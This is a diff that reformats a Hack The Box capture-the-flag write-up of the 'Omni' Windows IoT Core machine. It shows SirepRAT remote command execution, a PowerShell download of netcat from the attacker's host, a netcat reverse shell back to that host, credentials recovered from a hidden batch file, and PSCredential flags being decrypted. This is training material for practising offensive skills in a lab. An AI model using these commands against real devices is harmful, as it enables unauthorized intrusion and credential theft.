@@ -1,9 +1,8 @@
-
-# HTB - omni
+# HTB - Omni
 
 ## Overview
 
-![](<machine>.infocard.png)
+![](https://github.com/zweilosec/htb-writeups/tree/ee4311fea379f6b6d27917f5470a6d2e6af707f2/windows-machines/easy/machine%3E.infocard.png)
 
 Short description to include any strange things to be dealt with
 
@@ -11,20 +10,19 @@ Short description to include any strange things to be dealt with
 
 #### Useful thing 1
 
-- description with generic example
+* description with generic example
 
 #### Useful thing 2
 
-- description with generic example
+* description with generic example
 
 ## Enumeration
 
 ### Nmap scan
 
-
 I started my enumeration with an nmap scan of `10.10.10.204`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
 
-```
+```text
 ┌──(zweilos㉿kalimaa)-[~/htb/omni]
 └─$ sudo nmap -sSCV -p- -n -v -oA omni 10.10.10.204
 [sudo] password for zweilos: 
@@ -101,19 +99,19 @@ Nmap done: 1 IP address (1 host up) scanned in 201.47 seconds
            Raw packets sent: 131163 (5.771MB) | Rcvd: 105 (4.816KB)
 ```
 
-There were a few standard Windows ports such as 135 - RPC, 3895 - Windows Remote Management, as well as a web server hosted on port 8080.  There were also a few ports in the 29000 range that I did not recognize, including one that was identified by nmap as `ARCserve Discovery`. 
+There were a few standard Windows ports such as 135 - RPC, 3895 - Windows Remote Management, as well as a web server hosted on port 8080. There were also a few ports in the 29000 range that I did not recognize, including one that was identified by nmap as `ARCserve Discovery`.
 
 I started out my enumeration with the web server on port 8080.
 
-https://www.blackhat.com/docs/us-16/materials/us-16-Sabanal-Into-The-Core-In-Depth-Exploration-Of-Windows-10-IoT-Core-wp.pdf
+[https://www.blackhat.com/docs/us-16/materials/us-16-Sabanal-Into-The-Core-In-Depth-Exploration-Of-Windows-10-IoT-Core-wp.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Sabanal-Into-The-Core-In-Depth-Exploration-Of-Windows-10-IoT-Core-wp.pdf)
 
-> You can login to the Windows Device Portal using the default Administrator credentials (User name: Administrator, Password: p@ssw0rd). 
+> You can login to the Windows Device Portal using the default Administrator credentials \(User name: Administrator, Password: p@ssw0rd\).
 
 unfortunately the owners have changed the default password
 
-https://www.thomasmaurer.ch/2015/06/how-to-connect-to-windows-10-iot-core-via-powershell/
+[https://www.thomasmaurer.ch/2015/06/how-to-connect-to-windows-10-iot-core-via-powershell/](https://www.thomasmaurer.ch/2015/06/how-to-connect-to-windows-10-iot-core-via-powershell/)
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/omni]
 └─$ pwsh                                                             
 PowerShell 7.0.0
@@ -132,9 +130,9 @@ Enter-PSSession: MI_RESULT_ACCESS_DENIED
 
 denied again...I need to find the password to continue
 
-https://www.zdnet.com/article/new-exploit-lets-attackers-take-control-of-windows-iot-core-devices/
+[https://www.zdnet.com/article/new-exploit-lets-attackers-take-control-of-windows-iot-core-devices/](https://www.zdnet.com/article/new-exploit-lets-attackers-take-control-of-windows-iot-core-devices/)
 
-```
+```text
 ┌──(zweilos㉿kalimaa)-[~/htb/omni/SirepRAT]
 └─$ python SirepRAT.py 10.10.10.204 --help                                                          2 ⨯
 usage: SirepRAT.py target_device_ip command_type [options]
@@ -170,7 +168,7 @@ remarks:
 -       Use moustaches to wrap remote environment variables to expand (e.g. {{userprofile}})
 
 Usage example: python SirepRAT.py 192.168.3.17 GetFileFromDevice --remote_path C:\Windows\System32\hostname.exe
-                                                                                                        
+
 ┌──(zweilos㉿kalimaa)-[~/htb/omni/SirepRAT]
 └─$ python SirepRAT.py 10.10.10.204 GetSystemInformationFromDevice
 <SystemInformationResult | type: 51, payload length: 32, kv: {'wProductType': 0, 'wServicePackMinor': 2, 'dwBuildNumber': 17763, 'dwOSVersionInfoSize': 0, 'dwMajorVersion': 10, 'wSuiteMask': 0, 'dwPlatformId': 2, 'wReserved': 0, 'wServicePackMajor': 1, 'dwMinorVersion': 0, 'szCSDVersion': 0}>
@@ -178,7 +176,7 @@ Usage example: python SirepRAT.py 192.168.3.17 GetFileFromDevice --remote_path C
 
 There aren't a lot of useful files that have known locations on a windows machine so I tried to grab the hosts file in `C:\Windows\System32\drivers\etc\`
 
-```
+```text
 ┌──(zweilos㉿kalimaa)-[~/htb/omni/SirepRAT]
 └─$ python SirepRAT.py 10.10.10.204 GetFileFromDevice --remote_path "C:\Windows\System32\drivers\etc\hosts" --v
 ---------
@@ -211,7 +209,7 @@ There aren't a lot of useful files that have known locations on a windows machin
 
 Next I had to try running commands to see what privileges I actually had
 
-```
+```text
 ┌──(zweilos㉿kalimaa)-[~/htb/omni/SirepRAT]
 └─$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c set" --v                                                                  
 ---------
@@ -253,9 +251,9 @@ windir=C:\windows
 <ErrorStreamResult | type: 12, payload length: 4, payload peek: ''>
 ```
 
-First I ran the `set` command, which returned a list of the local environment variables 
+First I ran the `set` command, which returned a list of the local environment variables
 
-```
+```text
 ┌──(zweilos㉿kalimaa)-[~/htb/omni/SirepRAT]
 └─$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c set" --v
 ---------
@@ -296,9 +294,10 @@ windir=C:\windows
 <OutputStreamResult | type: 11, payload length: 1292, payload peek: 'AllUsersProfile=C:\Data\ProgramDataAPPDATA=C:\Da'>
 <ErrorStreamResult | type: 12, payload length: 4, payload peek: ''>
 ```
+
 Next I ran the same command to see if there was any difference in using the `--as_logged_on_user` flag. I noticed that there seemed to be a user called "DefaultAccount" logged in
 
-```
+```text
 ┌──(zweilos㉿kalimaa)-[~/htb/omni/SirepRAT]
 └─$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " -c whoami /all" --v
 ---------
@@ -311,9 +310,9 @@ C:\windows\system32>
 <OutputStreamResult | type: 11, payload length: 125, payload peek: 'Microsoft Windows [Version 10.0.17763.107]Copyri'>
 ```
 
-My context seems to be running commands as System, so this should be a quick and easy win...right? (failed to notice this was still "logged on user")
+My context seems to be running commands as System, so this should be a quick and easy win...right? \(failed to notice this was still "logged on user"\)
 
-```
+```text
 ┌──(zweilos㉿kalimaa)-[~/htb/omni/SirepRAT]
 └─$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell.exe" --v 
 ---------
@@ -332,7 +331,7 @@ PS C:\windows\system32>
 
 A little bit of testing shows that I can run PowerShell
 
-```
+```text
 ┌──(zweilos㉿kalimaa)-[~/htb/omni/SirepRAT]
 └─$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c PowerShell.exe wget http://10.10.15.105:8099/nc64.exe -Outfile nc64.exe" --v
 ---------
@@ -345,7 +344,7 @@ At line:1 char:1
     + CategoryInfo          : ObjectNotFound: (wget:String) [], CommandNotFoun 
    dException
     + FullyQualifiedErrorId : CommandNotFoundException
- 
+
 
 ---------
 <HResultResult | type: 1, payload length: 4, HResult: 0x0>
@@ -355,7 +354,7 @@ At line:1 char:1
 
 wget as an alias is not configured...this may be a limited version of PowerShell
 
-```
+```text
 ┌──(zweilos㉿kalimaa)-[~/htb/omni/SirepRAT]
 └─$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c PowerShell.exe Invoke-WebRequest http://10.10.15.105:8099/nc.exe -Outfile nc.exe" --v 
 ---------
@@ -367,7 +366,7 @@ At line:1 char:1
    zedAccessException
     + FullyQualifiedErrorId : System.UnauthorizedAccessException,Microsoft.Pow 
    erShell.Commands.InvokeWebRequestCommand
- 
+
 
 ---------
 <HResultResult | type: 1, payload length: 4, HResult: 0x0>
@@ -375,9 +374,9 @@ At line:1 char:1
 <ErrorStreamResult | type: 12, payload length: 4, payload peek: ''>
 ```
 
-so maybe I am not running as System as thought, since I was unable to write to the System32 folder (the folder I was in by default.)
+so maybe I am not running as System as thought, since I was unable to write to the System32 folder \(the folder I was in by default.\)
 
-```
+```text
 ┌──(zweilos㉿kalimaa)-[~/htb/omni/SirepRAT]
 └─$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c PowerShell.exe mkdir C:\temp" --v                              
 <HResultResult | type: 1, payload length: 4, HResult: 0x0>
@@ -399,19 +398,19 @@ Keyboard interrupt received, exiting.
 
 Since I could not write to the current folder, I simply made a temp directory and uploaded my nc.exe there
 
-```
+```text
 ┌──(zweilos㉿kalimaa)-[~/htb/omni/SirepRAT]
 └─$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c PowerShell.exe  C:\temp\nc64.exe 10.10.15.105 55541 -e Powershell.exe" --v
 <HResultResult | type: 1, payload length: 4, HResult: 0x0>
 ```
 
 After uploading netcat to the `temp` folder I created I sent a reverse shell back to my machine
+
 ## Initial Foothold
 
 ## Road to User
 
-
-```
+```text
 ┌──(zweilos㉿kalimaa)-[~/htb/omni]
 └─$ nc -lvnp 55541        
 listening on [any] 55541 ...
@@ -425,13 +424,13 @@ Atwhoami /allr:1
 + ~~~~~~~~~                                    whoami:String) [], CommandNo                             
    tFoundException          : ObjectNotFound: (                                                         
     + FullyQualifiedErrorId : CommandNotFoundException                                                  
-                                                                                                        
+
 PS C:\windows\system32>
 ```
 
 Ok...so my shell is a little shaky...and whoami is not installed
 
-```
+```text
 PS C:\Windows\system32> ls env:
 ls env:
 
@@ -471,9 +470,9 @@ USERPROFILE                    C:\Data\Users\System
 windir                         C:\windows
 ```
 
-Since I couldn't use `whoami` I used `ls env:` to once again check the environment variables to see who I was.  I seemed to be the user `omni$`. 
+Since I couldn't use `whoami` I used `ls env:` to once again check the environment variables to see who I was. I seemed to be the user `omni$`.
 
-```
+```text
 PS C:\Data\Users> ls
 ls
 
@@ -529,9 +528,9 @@ type root.txt
 </Objs>
 ```
 
-I was able to enter the Administrator folder and use `type` to get the contents of the `root.txt` flag, but it did not contain the contents I expected.  It seemed to be a PowerShell credential object written to a file.
+I was able to enter the Administrator folder and use `type` to get the contents of the `root.txt` flag, but it did not contain the contents I expected. It seemed to be a PowerShell credential object written to a file.
 
-```
+```text
 PS C:\Data\Users\administrator> type root.txt
 type root.txt
 <Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
@@ -557,7 +556,7 @@ At line:1 char:15
    Exception
     + FullyQualifiedErrorId : System.Security.Cryptography.CryptographicExcept 
    ion,Microsoft.PowerShell.Commands.ImportClixmlCommand
- 
+
 PS C:\Data\Users\administrator> $credential = Import-CliXml -Path C:\Data\Users\administrator\root.txt
 $credential = Import-CliXml -Path C:\Data\Users\administrator\root.txt
 Import-CliXml : Error occurred during a cryptographic operation.
@@ -568,17 +567,16 @@ At line:1 char:15
    Exception
     + FullyQualifiedErrorId : System.Security.Cryptography.CryptographicExcept 
    ion,Microsoft.PowerShell.Commands.ImportClixmlCommand
-
 ```
 
 I tried importing the credential information to see if I could directly use it, but it gave me a an error message stating that an "Error occurred during a cryptographic operation."
 
-* https://social.msdn.microsoft.com/Forums/sqlserver/en-US/cfd1cfd8-cbeb-42eb-b8bd-68f4d8b451f1/convertfromsecurestring-throws-a-cryptographicexception-in-windows-iot?forum=WindowsIoT
-* https://sodocumentation.net/powershell/topic/2917/handling-secrets-and-credentials
+* [https://social.msdn.microsoft.com/Forums/sqlserver/en-US/cfd1cfd8-cbeb-42eb-b8bd-68f4d8b451f1/convertfromsecurestring-throws-a-cryptographicexception-in-windows-iot?forum=WindowsIoT](https://social.msdn.microsoft.com/Forums/sqlserver/en-US/cfd1cfd8-cbeb-42eb-b8bd-68f4d8b451f1/convertfromsecurestring-throws-a-cryptographicexception-in-windows-iot?forum=WindowsIoT)
+* [https://sodocumentation.net/powershell/topic/2917/handling-secrets-and-credentials](https://sodocumentation.net/powershell/topic/2917/handling-secrets-and-credentials)
 
 AFter doing some reading, it looked like I needed to find a key
 
-```
+```text
 PS C:\Data\Users\administrator> net users
 net users
 
@@ -593,7 +591,7 @@ The command completed with one or more errors.
 
 sshd? interesting
 
-```
+```text
 PS C:\Data\Users> cd app
 cd app
 PS C:\Data\Users\app> ls
@@ -634,9 +632,9 @@ type user.txt
 </Objs>
 ```
 
-In the folder `C:\Data\Users\app` I found the `user.txt` flag, but it was also encrypted the same way as the `root.txt`.  
+In the folder `C:\Data\Users\app` I found the `user.txt` flag, but it was also encrypted the same way as the `root.txt`.
 
-```
+```text
 PS C:\Data\Users\app> type hardening.txt
 type hardening.txt
 type : Access to the path 'C:\Data\Users\app\hardening.txt' is denied.
@@ -647,7 +645,7 @@ At line:1 char:1
    xt:String) [Get-Content], UnauthorizedAccessException
     + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsof 
    t.PowerShell.Commands.GetContentCommand
- 
+
 PS C:\Data\Users\app> get-acl hardening.txt
 get-acl hardening.txt
 
@@ -662,7 +660,7 @@ hardening.txt OMNI\Administrator NT AUTHORITY\SYSTEM Deny  Read, Synchronize...
 
 haha so this file is locked so that it is owned by `Administrator`, but also so `NT AUTHORITY\SYSTEM` cannot read it...very odd
 
-```
+```text
 PS C:\Data\Users\app> type iot-admin.xml
 type iot-admin.xml
 <Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
@@ -682,7 +680,7 @@ type iot-admin.xml
 
 The `iot-admin.xml` file was another PowerShell credential file
 
-```
+```text
 PS C:\Data\Users\app> $credential = Import-CliXml -Path C:\Data\Users\app\iot-admin.xml
 $credential = Import-CliXml -Path C:\Data\Users\app\iot-admin.xml
 Import-CliXml : Error occurred during a cryptographic operation.
@@ -693,7 +691,7 @@ At line:1 char:15
    Exception
     + FullyQualifiedErrorId : System.Security.Cryptography.CryptographicExcept 
    ion,Microsoft.PowerShell.Commands.ImportClixmlCommand
- 
+
 PS C:\Data\Users\app> $credential = Import-CliXml -Path C:\Data\Users\app\user.txt
 $credential = Import-CliXml -Path C:\Data\Users\app\user.txt
 Import-CliXml : Error occurred during a cryptographic operation.
@@ -708,7 +706,7 @@ At line:1 char:15
 
 I still needed a key to decode these as well it seems
 
-```
+```text
 PS C:\Data\Users\DevToolsUser> cd "C:\Program Files"
 cd "C:\Program Files"
 PS C:\Program Files> ls
@@ -754,17 +752,15 @@ d-----       10/26/2018  11:37 PM                Pester
 d-----       10/26/2018  11:37 PM                PowerShellGet
 ```
 
-After poking around in the user folders for a little bit and finding nothing useful, I decided to see what programs were installed.  There was only PowerShell with a limited set of modules installed.
+After poking around in the user folders for a little bit and finding nothing useful, I decided to see what programs were installed. There was only PowerShell with a limited set of modules installed.
 
 After searching through the files here I found nothing useful. There was also nothing interesting in netstat or services
 
-
 ### Finding user creds
-
 
 After searching for a long time and not finding anything I started searching the user directories and Program Files for hidden files
 
-```
+```text
 PS C:\Program files\WindowsPowerShell> ls -Recurse -Hidden
 ls -Recurse -Hidden
 
@@ -777,9 +773,9 @@ Mode                LastWriteTime         Length Name
 -a-h--        8/21/2020  12:56 PM            247 r.bat
 ```
 
-There were many many hidden files in the users directories, most of them were desktop.ini files and random config files in appdata.  However, in the program files directory there was only one hidden file, and it contained some very useful information
+There were many many hidden files in the users directories, most of them were desktop.ini files and random config files in appdata. However, in the program files directory there was only one hidden file, and it contained some very useful information
 
-```
+```text
 PS C:\Program Files\WindowsPowerShell\Modules\PackageManagement> type r.bat 
 type r.bat
 @echo off
@@ -802,15 +798,15 @@ GOTO :LOOP
 
 It looked like this batch script contained the passwords for both the `app` user and `administrator`!
 
-https://davidhamann.de/2019/12/08/running-command-different-user-powershell/
+[https://davidhamann.de/2019/12/08/running-command-different-user-powershell/](https://davidhamann.de/2019/12/08/running-command-different-user-powershell/)
 
 > `powershell.exe -c "$user='WORKGROUP\John'; $pass='password123'; try { Invoke-Command -ScriptBlock { Get-Content C:\Users\John\Desktop\secret.txt } -ComputerName Server123 -Credential (New-Object System.Management.Automation.PSCredential $user,(ConvertTo-SecureString $pass -AsPlainText -Force)) } catch { echo $_.Exception.Message }" 2>&1`
 
-```
+```text
 Get-Content C:\Data\Users\app\user.txt -Credential (New-Object System.Management.Automation.PSCredential $user,(ConvertTo-SecureString $pass -AsPlainText -Force))
 ```
 
-```
+```text
 PS C:\Program Files\WindowsPowerShell\Modules\PackageManagement> Get-Content C:\Data\Users\app\user.txt -Credential (New-Object System.Management.Automation.PSCredential $user,(ConvertTo-SecureString $pass -AsPlainText -Force))
 Get-Content C:\Data\Users\app\user.txt -Credential (New-Object System.Management.Automation.PSCredential $user,(ConvertTo-SecureString $pass -AsPlainText -Force))
 The FileSystem provider supports credentials only on the New-PSDrive cmdlet. 
@@ -824,7 +820,7 @@ At line:1 char:1
 
 hmm it seems like I cannot run commands as another user. I need to find a way to login as the other two users
 
-```
+```text
 ┌──(zweilos㉿kalimaa)-[~/htb/omni]
 └─$ evil-winrm -i 10.10.10.204 -u app -p mesh5143                                
 
@@ -836,19 +832,19 @@ Error: An error of type WinRM::WinRMHTTPTransportError happened, message is Unab
 Body:  (404).                                                                                           
 
 Error: Exiting with code 1
-
 ```
-I tried logging in with WinRM but got an error.  Looking at my nmap output again I remembered that there was that web portal I saw earlier
+
+I tried logging in with WinRM but got an error. Looking at my nmap output again I remembered that there was that web portal I saw earlier
 
 Pictures of portal
 
-Using the command `set` I was able to list all of the currently set environment variables, including the current user context I was running in. 
+Using the command `set` I was able to list all of the currently set environment variables, including the current user context I was running in.
 
 ## User.txt
 
-Since I was running as `app` and could execute arbitrary commands I 
+Since I was running as `app` and could execute arbitrary commands I
 
-```
+```text
 Command> powershell.exe Invoke-Command -ScriptBlock { $credential = Import-CliXml -Path C:\Data\Users\app\user.txt; $credential.GetNetworkCredential().Password }
 
 7cfd50f6bc34db3204898f1505ad9d70
@@ -856,7 +852,7 @@ Command> powershell.exe Invoke-Command -ScriptBlock { $credential = Import-CliXm
 
 next I cleared my cookies for the site, closed and reopened the browser, then logged in as `administrator` to see if the same process could be done for the `root.txt`
 
-```
+```text
 Command> type C:\Data\Users\app\hardening.txt
 
 - changed default administrator password of "p@ssw0rd"
@@ -864,12 +860,11 @@ Command> type C:\Data\Users\app\hardening.txt
 - added firewall rules to restrict unnecessary services
 
 - removed administrator account from "Ssh Users" group
-
 ```
 
-Now that I was the administrator user I could read the hardening steps.  It's strange that this file would be locked so only the admin could read it... in apps folder too
+Now that I was the administrator user I could read the hardening steps. It's strange that this file would be locked so only the admin could read it... in apps folder too
 
-```
+```text
 Command> powershell.exe Invoke-Command -ScriptBlock { $credential = Import-CliXml -Path C:\Data\Users\app\iot-admin.xml; $credential.GetNetworkCredential().Password }
 
 Import-CliXml : Error occurred during a cryptographic operation.
@@ -888,7 +883,7 @@ At line:1 char:45
 
    ion,Microsoft.PowerShell.Commands.ImportClixmlCommand
 
- 
+
 
 You cannot call a method on a null-valued expression.
 
@@ -901,14 +896,13 @@ At line:1 char:98
     + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
 
     + FullyQualifiedErrorId : InvokeMethodOnNull
-
 ```
 
 I still wasn't able to decode `iot-admin.xml` for some reason
 
 ## Root.txt
 
-```
+```text
 Command> powershell.exe Invoke-Command -ScriptBlock { $credential = Import-CliXml -Path C:\Data\Users\administrator\root.txt; $credential.GetNetworkCredential().Password }
 
 5dbdce5569e2c4708617c0ce6e9bf11d
@@ -918,6 +912,7 @@ I was able to get the root flag though!
 
 pwned img
 
-Thanks to [`egre55`](https://app.hackthebox.eu/users/1190) for... [something interesting or useful about this machine.]
+Thanks to [`egre55`](https://app.hackthebox.eu/users/1190) for... \[something interesting or useful about this machine.\]
 
 If you like this content and would like to see more, please consider supporting me through Patreon at [https://www.patreon.com/zweilosec](https://www.patreon.com/zweilosec).
+
